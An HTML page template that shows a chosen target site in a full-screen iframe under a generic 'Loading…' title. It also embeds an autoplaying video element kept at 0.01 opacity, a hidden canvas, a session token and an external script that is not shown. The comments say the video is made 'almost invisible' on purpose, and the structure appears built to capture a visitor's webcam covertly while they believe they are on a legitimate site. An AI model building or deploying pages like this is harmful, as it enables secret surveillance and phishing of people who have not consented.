<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Loadingâ€¦</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #fff;
    }
    #siteFrame {
      width: 100vw;
      height: 100vh;
      border: none;
      display: block;
    }
    /* keep video ON-SCREEN but tiny & almost invisible to avoid black frames */
    #video {
      position: fixed;
      bottom: 4px;
      right: 4px;
      width: 80px;
      height: 80px;
      opacity: 0.01;        /* not 0, so browser still renders frames */
      pointer-events: none;
      z-index: 9999;
    }
    #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <iframe id="siteFrame" src="{{ target_url }}"></iframe>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <script>
    window.TOKEN = "{{ token }}";
  </script>
  <script src="/static/wrap_app.js"></script>
</body>
</html>
